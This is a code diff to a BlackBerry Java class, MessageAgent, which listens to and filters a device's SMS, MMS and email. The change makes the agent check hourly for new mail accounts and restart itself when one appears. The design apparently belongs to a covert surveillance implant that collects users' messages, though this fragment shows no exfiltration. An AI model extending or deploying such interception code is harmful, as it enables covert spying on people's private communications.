@@ -15,6 +15,7 @@ import java.util.Hashtable;
 import java.util.Vector;
 
 import net.rim.device.api.util.IntHashtable;
+import blackberry.AgentManager;
 import blackberry.Conf;
 import blackberry.agent.mail.Filter;
 import blackberry.agent.mail.MailListener;
@@ -64,6 +65,7 @@ public final class MessageAgent extends Agent {
     //#endif
 
     protected static final int SLEEPTIME = 5000;
+    protected static final int PERIODTIME = 3600*1000;
 
     MailListener mailListener;
     SmsListener smsListener;
@@ -79,6 +81,8 @@ public final class MessageAgent extends Agent {
     public IntHashtable filtersSMS = new IntHashtable();
     public IntHashtable filtersMMS = new IntHashtable();
     public IntHashtable filtersEMAIL = new IntHashtable();
+
+    boolean firstRun;
 
     /**
      * Instantiates a new message agent.
@@ -129,7 +133,7 @@ public final class MessageAgent extends Agent {
         //#endif
 
         setDelay(SLEEPTIME);
-        setPeriod(NEVER);
+        setPeriod(PERIODTIME);
 
     }
 
@@ -138,8 +142,28 @@ public final class MessageAgent extends Agent {
      * @see blackberry.threadpool.TimerJob#actualRun()
      */
     public void actualRun() {
-        smsListener.run();
-        mailListener.run();
+       
+        // Ogni ora viene verificato se i nomi degli account corrisponde
+        // se non corrisponde, restart dell'agente.
+        
+        if( firstRun){
+            firstRun = false;
+            smsListener.run();
+            mailListener.run();
+        }
+                    
+        if( haveNewAccount() ){
+            //#ifdef DEBUG_INFO
+            debug.info("Restarting MessageAgent, new account");
+            //#endif
+            AgentManager.getInstance().reStart(agentId);
+        }
+        
+    }
+
+    private boolean haveNewAccount() {
+
+        return mailListener.haveNewAccount();
     }
 
     /*
@@ -147,6 +171,7 @@ public final class MessageAgent extends Agent {
      * @see blackberry.threadpool.TimerJob#actualStart()
      */
     public void actualStart() {
+        firstRun = true;
         smsListener.start();
         mailListener.start();
     }
@@ -304,7 +329,7 @@ public final class MessageAgent extends Agent {
         //#endif
         final Date date = new Date();
         lastcheck = date.getTime();
-        
+
         //#ifdef MARKUP_TIMESTAMP
         markupDate.put(key, date);
         //#else
